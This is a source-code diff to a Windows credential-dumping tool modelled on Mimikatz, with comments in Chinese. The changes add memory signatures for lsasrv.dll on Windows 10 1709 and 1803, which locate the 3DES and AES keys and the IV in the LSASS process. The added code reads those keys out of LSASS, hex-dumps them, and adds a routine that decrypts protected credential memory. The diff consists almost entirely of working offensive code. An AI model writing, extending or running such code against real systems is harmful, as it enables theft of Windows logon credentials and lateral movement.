@@ -2,6 +2,7 @@
 #include <Windows.h>
 #include "lsasrv.h"
 #include "process.h"
+#include "cng.h"
 
 static IMAGE_PATTERN lsasrv_h3deskey[] = {
 	{0x000a00003fab0135, 0x50245c8944db3345, -4}, //win10x64 1709
@@ -10,14 +11,30 @@ static IMAGE_PATTERN lsasrv_h3deskey[] = {
 	{0, 0, 0}
 };
 
+static IMAGE_PATTERN lsasrv_haeskey[] = {
+	{ 0x000a00003fab0135, 0xe18341c91b45d8f7, -4 }, //win10x64 1709
+	{ 0x000a000042ee00fe, 0x5de900000010b941, -4 }, //win10x64 1803
+
+	{ 0, 0, 0 }
+};
+
 static IMAGE_PATTERN lsasrv_IV[] = {
 	{0x000a00003fab0135, 0x7f0ff307e083c28b, -4}, //win10x64 1709
 	{0x000a000042ee00fe, 0xc2f65824447f0ff3, -4}, //win10x64 1803
 	{0, 0, 0}
 };
+#define MAX_KEY 128
+#define MAX_IV  16
 
-BOOL FindH3DesKey(IN HANDLE hLsass, OUT PKIWI_HARD_KEY lp3DesKey,
-	OUT LPBYTE lpIV, OUT LPDWORD lpcbIV)
+BYTE  szIV[MAX_IV]  = { 0 };
+DWORD cbIV = MAX_IV;
+BYTE  sz3DesKey[MAX_KEY] = { 0 };
+DWORD cb3DesKey = 0;
+BYTE  szAesKey[MAX_KEY]  = { 0 };
+DWORD cbAesKey  = 0;
+
+
+BOOL FindBcryptKeys()
 {
 	/*  Win10 lsasrv.dll, 目前没找到特殊方法，靠传统的硬编码来找
 	LsaUnprotectMemory:
@@ -53,31 +70,65 @@ BOOL FindH3DesKey(IN HANDLE hLsass, OUT PKIWI_HARD_KEY lp3DesKey,
 	GOTO_MSG_IF(lpPtr == NULL, cleanup, L"Cant find h3deskey pointer, maybe unsupport this version\r\n");
 
 	//从lsass进程读取h3deskey指针
-	SIZE_T cbMemoryRead = 0;
-	BOOL bRet = ReadProcessMemory(hLsass, lpPtr, &lpPtr, sizeof(LPVOID), &cbMemoryRead);
+	BOOL bRet = ReadLsassMemory(lpPtr, &lpPtr, sizeof(LPVOID));
 	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);
 	//读取h3deskey结构，其为一个bcrypt handle
 	KIWI_BCRYPT_HANDLE_KEY szBcryptHandleKey;
-	bRet = ReadProcessMemory(hLsass, lpPtr, &szBcryptHandleKey, sizeof(szBcryptHandleKey), &cbMemoryRead);
+	bRet = ReadLsassMemory(lpPtr, &szBcryptHandleKey, sizeof(szBcryptHandleKey));
 	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);
 
 	//MESSAGE(L"h3deskey structure=> Size:%x, Tag:%x, Keyptr:%p\r\n", szBcryptHandleKey.size,
 	//		szBcryptHandleKey.tag, szBcryptHandleKey.key);
 	//读取bcrypt key, kiwi_bcrypt_key81适用于win10，这里应对不同系统进行“适配”，这里未做
 	KIWI_BCRYPT_KEY81 szBcryptKey;
-	bRet = ReadProcessMemory(hLsass, szBcryptHandleKey.key, &szBcryptKey, sizeof(szBcryptKey), &cbMemoryRead);
+	bRet = ReadLsassMemory(szBcryptHandleKey.key, &szBcryptKey, sizeof(szBcryptKey));
 	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);
 
-	//输出key
-	CopyMemory(lp3DesKey, (LPVOID)&szBcryptKey.hardkey, sizeof(KIWI_HARD_KEY));
+	//输出3deskey
+	cb3DesKey = szBcryptKey.hardkey.cbSecret;
+	CopyMemory(sz3DesKey, (LPVOID)&szBcryptKey.hardkey.data, cb3DesKey);
+	
+	//从lsass读取aeskey
+	lpPtr = FindPatternFromModule(hModule, (PIMAGE_PATTERN)&lsasrv_haeskey, lpStart, lpEnd, 0);
+	GOTO_MSG_IF(lpPtr == NULL, cleanup, L"Cant find haeskey pointer, maybe unsupport this version\r\n");
+	bRet = ReadLsassMemory(lpPtr, &lpPtr, sizeof(LPVOID));
+	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);
+	bRet = ReadLsassMemory(lpPtr, &szBcryptHandleKey, sizeof(szBcryptHandleKey));
+	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);
+	//MESSAGE(L"haeskey structure=> Size:%x, Tag:%x, Keyptr:%p\r\n", szBcryptHandleKey.size,
+	//		szBcryptHandleKey.tag, szBcryptHandleKey.key);
+	bRet = ReadLsassMemory(szBcryptHandleKey.key, &szBcryptKey, sizeof(szBcryptKey));
+	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);
+	//输出aeskey
+	cbAesKey = szBcryptKey.hardkey.cbSecret;
+	CopyMemory(szAesKey, (LPVOID)&szBcryptKey.hardkey.data, cbAesKey);
+
 	//查找IV
 	lpPtr = FindPatternFromModule(hModule, (PIMAGE_PATTERN)&lsasrv_IV, lpStart, lpEnd, 0);
-	//3deskey为8字节，win10使用，这里未作AES（16字节）的适配，故使用8字节
-	*lpcbIV = 0x08;
-	bRet = ReadProcessMemory(hLsass, lpPtr, lpIV, *lpcbIV, &cbMemoryRead);
+	//IV共16个字节，3des使用8，aes使用16
+	bRet = ReadLsassMemory(lpPtr, szIV, cbIV);
 	GOTO_IF(!bRet, L"ReadProcessMemory", cleanup);
+
+	MESSAGE(L"3DES Key => Size:%x, Key array: ", cb3DesKey);
+	HexDump((LPBYTE)&sz3DesKey, cb3DesKey, FALSE);
+	MESSAGE(L"AES Key  => Size:%x, Key array: ", cbAesKey);
+	HexDump((LPBYTE)&szAesKey, cbAesKey, FALSE);
+	MESSAGE(L"IV  => IV array: ");
+	HexDump(szIV, cbIV, FALSE);
 cleanup:
 	FreeLibrary(hModule);
 	return bRet;
 }
 
+BOOL LsaEncryptMemory(IN OUT LPBYTE lpBuf, IN DWORD cbBuf, IN INT unused)
+{
+	/*
+	MESSAGE(L"3DES Key => Size:%x, Key array: ", cb3DesKey);
+	HexDump((LPBYTE)&sz3DesKey, cb3DesKey, FALSE);
+	MESSAGE(L"AES Key  => Size:%x, Key array: ", cbAesKey);
+	HexDump((LPBYTE)&szAesKey, cbAesKey, FALSE);
+	MESSAGE(L"IV  => IV array: ");
+	HexDump(szIV, cbIV, FALSE);
+	*/
+	return DesDecrypt(lpBuf, cbBuf, sz3DesKey, cb3DesKey, szIV, cbIV, lpBuf, cbBuf);
+}
